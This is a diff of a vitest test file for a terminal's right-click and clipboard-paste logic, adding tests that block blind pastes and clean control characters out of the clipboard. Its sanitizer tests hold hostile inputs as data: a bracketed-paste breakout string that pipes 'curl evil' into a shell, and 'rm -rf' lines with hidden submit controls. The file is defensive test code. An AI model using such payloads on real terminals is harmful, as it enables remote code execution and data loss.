@@ -2,6 +2,9 @@ import { describe, it, expect } from 'vitest'
 import {
   isControlReportOnly,
   decideContextMenuAction,
+  resolveContextMenuIntent,
+  blindPasteNeedsMenu,
+  sanitizeClipboardForPaste,
   isPasteChord,
   isCopyChord,
   shouldHandleTerminalPaste,
@@ -34,24 +37,132 @@ describe('isControlReportOnly', () => {
 })
 
 describe('decideContextMenuAction', () => {
-  describe('classic mode (classicTerminalCopyPaste: true)', () => {
-    it('returns copy when text is selected', () => {
-      expect(decideContextMenuAction(true, true)).toBe('copy')
-    })
-    it('returns paste when nothing is selected', () => {
-      expect(decideContextMenuAction(false, true)).toBe('paste')
-    })
+  const decide = (over: Partial<Parameters<typeof decideContextMenuAction>[0]> = {}) =>
+    decideContextMenuAction({ hasSelection: false, classicMode: true, mouseTracking: false, ...over })
+
+  it('copies whenever text is selected — in every mode', () => {
+    // A visible selection is an unambiguous copy request. With mouse tracking
+    // on it can only exist via Shift+drag, which is just as deliberate.
+    expect(decide({ hasSelection: true })).toBe('copy')
+    expect(decide({ hasSelection: true, mouseTracking: true })).toBe('copy')
+    expect(decide({ hasSelection: true, classicMode: false })).toBe('copy')
+    expect(decide({ hasSelection: true, classicMode: false, mouseTracking: true })).toBe('copy')
   })
 
-  describe('non-classic mode (CC mouse on / copy-on-select active)', () => {
-    // CC already copies on mouse-up; right-click must always paste regardless
-    // of selection state so it never overwrites the intended paste target.
-    it('returns paste when nothing is selected', () => {
-      expect(decideContextMenuAction(false, false)).toBe('paste')
-    })
-    it('returns paste even when text is selected', () => {
-      expect(decideContextMenuAction(true, false)).toBe('paste')
-    })
+  it('classic + no tracking + no selection → paste (the PuTTY behaviour the setting promises)', () => {
+    expect(decide()).toBe('paste')
+  })
+
+  it('NEVER blind-pastes while mouse tracking is on — shows the menu instead', () => {
+    // THE defect this replaces: with a TUI tracking the mouse, xterm disables
+    // its selection service, so "no selection" is guaranteed and the old rule
+    // pasted the clipboard into the PTY on every right-click. A right-click at
+    // a mouse-mode claude's login screen pasted (and at a shell prompt would
+    // execute) the clipboard the user was trying to COPY into.
+    expect(decide({ mouseTracking: true })).toBe('menu')
+    expect(decide({ mouseTracking: true, classicMode: false })).toBe('menu')
+  })
+
+  it('non-classic + no selection → menu, never the old unconditional paste', () => {
+    // The old "always paste" assumed CC's copy-on-select had already copied.
+    // Nothing in CCC handles OSC 52, so that premise was false — the menu
+    // gives an explicit Paste one click away instead.
+    expect(decide({ classicMode: false })).toBe('menu')
+  })
+})
+
+describe('sanitizeClipboardForPaste', () => {
+  it('strips an embedded bracketed-paste END sentinel (the RCE breakout)', () => {
+    // term.paste() wraps text in \x1b[200~..\x1b[201~ but does not strip an
+    // embedded end marker, so a clipboard carrying one breaks out of the wrap
+    // and the trailing bytes execute. Removing ESC removes the sentinel.
+    const evil = 'echo hi\x1b[201~\r; curl evil | sh\r'
+    const clean = sanitizeClipboardForPaste(evil)
+    // The ESC is gone, so \x1b[201~ is no longer the bracketed-paste end marker —
+    // the leftover literal "[201~" is inert text the terminal never interprets.
+    expect(clean).not.toContain('\x1b')
+    expect(clean).toBe('echo hi[201~\r; curl evil | sh\r')
+  })
+
+  it('strips readline accept-line controls that submit with no newline (Ctrl-O etc.)', () => {
+    // \x0f = operate-and-get-next; \x01 = beginning-of-line; both are C0 controls
+    // a newline check would miss. All must go.
+    expect(sanitizeClipboardForPaste('rm -rf important\x0f')).toBe('rm -rf important')
+    expect(sanitizeClipboardForPaste('\x01payload')).toBe('payload')
+  })
+
+  it('preserves tab and the newline pair (needed downstream), and normal text', () => {
+    expect(sanitizeClipboardForPaste('a\tb')).toBe('a\tb')
+    expect(sanitizeClipboardForPaste('line1\nline2\r')).toBe('line1\nline2\r')
+    expect(sanitizeClipboardForPaste('npm run typecheck')).toBe('npm run typecheck')
+    // Multi-byte UTF-8 (>= 0x80) is not a C0 control — untouched.
+    expect(sanitizeClipboardForPaste('café → 日本語')).toBe('café → 日本語')
+  })
+
+  it('strips DEL (0x7f) as well', () => {
+    expect(sanitizeClipboardForPaste('a\x7fb')).toBe('ab')
+  })
+})
+
+describe('resolveContextMenuIntent (the term.modes wiring)', () => {
+  // A fake terminal exposing just the slice the resolver reads. This is the glue
+  // that a pure-function test of decideContextMenuAction cannot cover: a flip of
+  // the mouseTrackingMode compare in resolveContextMenuIntent must FAIL here.
+  const fakeTerm = (over: {
+    selection?: string
+    mouseTrackingMode?: string
+    bracketedPasteMode?: boolean
+    noModes?: boolean
+  } = {}) => ({
+    getSelection: () => over.selection ?? '',
+    modes: over.noModes
+      ? undefined
+      : { mouseTrackingMode: over.mouseTrackingMode ?? 'none', bracketedPasteMode: over.bracketedPasteMode ?? false },
+  })
+
+  it('maps a mouse-tracking terminal (no selection) to the menu, not a paste', () => {
+    expect(resolveContextMenuIntent(fakeTerm({ mouseTrackingMode: 'any' }), true).action).toBe('menu')
+    expect(resolveContextMenuIntent(fakeTerm({ mouseTrackingMode: 'vt200' }), false).action).toBe('menu')
+  })
+
+  it('maps a non-tracking classic prompt (no selection) to a paste', () => {
+    const r = resolveContextMenuIntent(fakeTerm({ mouseTrackingMode: 'none' }), true)
+    expect(r.action).toBe('paste')
+    expect(r.mouseTracking).toBe(false)
+  })
+
+  it('reports selection as copy and surfaces bracketedPaste for the caller', () => {
+    const r = resolveContextMenuIntent(fakeTerm({ selection: 'x', bracketedPasteMode: true }), true)
+    expect(r.action).toBe('copy')
+    expect(r.bracketedPaste).toBe(true)
+  })
+
+  it('treats absent term.modes as no tracking / no bracketed paste (no throw)', () => {
+    const r = resolveContextMenuIntent(fakeTerm({ noModes: true }), true)
+    expect(r.action).toBe('paste')
+    expect(r.mouseTracking).toBe(false)
+    expect(r.bracketedPaste).toBe(false)
+  })
+})
+
+describe('blindPasteNeedsMenu', () => {
+  it('routes multi-line clipboard through the menu when bracketed paste is off', () => {
+    // term.paste() converts \n to \r: at a raw prompt each line SUBMITS. One
+    // right-click would execute the clipboard — that needs an explicit click.
+    expect(blindPasteNeedsMenu('rm -rf /tmp/x\n', false)).toBe(true)
+    expect(blindPasteNeedsMenu('line1\nline2', false)).toBe(true)
+    expect(blindPasteNeedsMenu('line1\rline2', false)).toBe(true)
+  })
+
+  it('lets single-line text paste directly (no newline ⇒ nothing can submit)', () => {
+    expect(blindPasteNeedsMenu('https://example.com/very/long/url', false)).toBe(false)
+    expect(blindPasteNeedsMenu('npm run typecheck', false)).toBe(false)
+  })
+
+  it('lets multi-line text through when bracketed paste is active', () => {
+    // Bracketed paste wraps the payload in \x1b[200~..\x1b[201~ — newlines are
+    // literal there, and multi-line pastes into CC's input are routine.
+    expect(blindPasteNeedsMenu('line1\nline2\n', true)).toBe(false)
   })
 })
 
